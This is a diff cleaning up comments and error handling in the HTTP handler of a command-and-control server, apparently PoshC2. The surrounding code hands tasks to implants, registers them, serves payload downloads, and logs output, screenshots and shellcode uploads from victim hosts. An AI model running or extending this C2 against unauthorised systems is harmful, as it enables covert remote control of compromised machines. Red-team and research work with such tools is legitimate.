@@ -50,11 +50,8 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
         QuickCommandURI = select_item("QuickCommand", "C2Server")
         s.server_version = ServerHeader
         s.sys_version = ""
-        if s.cookieHeader:
-          r = ""
-        else:
+        if not s.cookieHeader:
            s.cookieHeader = "NONE"
-        # class Tasks()
         
         # implant gets a new task
         new_task = newTask(s.path)
@@ -139,7 +136,6 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
           s.send_header("Content-type", "application/x-msdownload")
           s.end_headers()
           s.wfile.write(content)
-        # class Implant()
         # register new implant
         elif new_implant_url in s.path and s.cookieHeader.startswith("SessionID"):
           implant_type = "Normal"
@@ -264,7 +260,6 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
                 print ("Task %s (%s) returned against implant %s on host %s\\%s @ %s (%s)" % (taskIdStr, task_owner, implantID, Domain, User, Hostname,now.strftime("%m/%d/%Y %H:%M:%S")))
               else:
                 print ("Task %s returned against implant %s on host %s\\%s @ %s (%s)" % (taskIdStr, implantID, Domain, User, Hostname,now.strftime("%m/%d/%Y %H:%M:%S")))
-              #print decCookie,Colours.END
               outputParsed = re.sub(r'123456(.+?)654321', '', rawoutput)
               outputParsed = outputParsed.rstrip()
 
@@ -283,7 +278,6 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
                 except Exception as e:
                   update_task(taskId, "Screenshot not captured, the screen could be locked or this user does not have access to the screen!")
                   print ("Screenshot not captured, the screen could be locked or this user does not have access to the screen!")
-              # What should this be now?
               elif (executedCmd.lower().startswith("$shellcode64")) or (executedCmd.lower().startswith("$shellcode64")):
                 update_task(taskId, "Upload shellcode complete")
                 print ("Upload shellcode complete")
@@ -360,9 +354,9 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
                 print (Colours.GREEN)
                 print (outputParsed + Colours.END)
         except Exception as e:
-          e = ""
           # print e
           # traceback.print_exc()
+          pass 
           
         finally:
           s.send_response(200)
@@ -384,7 +378,6 @@ if __name__ == '__main__':
     print (Colours.GREEN + logopic)
     print (Colours.END + "")
 
-    # KeyFile = None, CertFile = None, ClientCertCAs = None
     if os.path.isfile(Database):
       print ("Using existing database / project" + Colours.GREEN)
       C2 = get_c2server_all()
@@ -481,7 +474,6 @@ if __name__ == '__main__':
         httpd.socket = ssl.wrap_socket (httpd.socket, keyfile="%sposh.key" % ROOTDIR, certfile="%sposh.crt" % ROOTDIR, server_side=True, ssl_version=ssl.PROTOCOL_TLSv1)
     else:
       raise ValueError("Cannot find the certificate files")
-    #logging.basicConfig(level=logging.WARNING) # DEBUG,INFO,WARNING,ERROR,CRITICAL
 
     try:
         httpd.serve_forever()
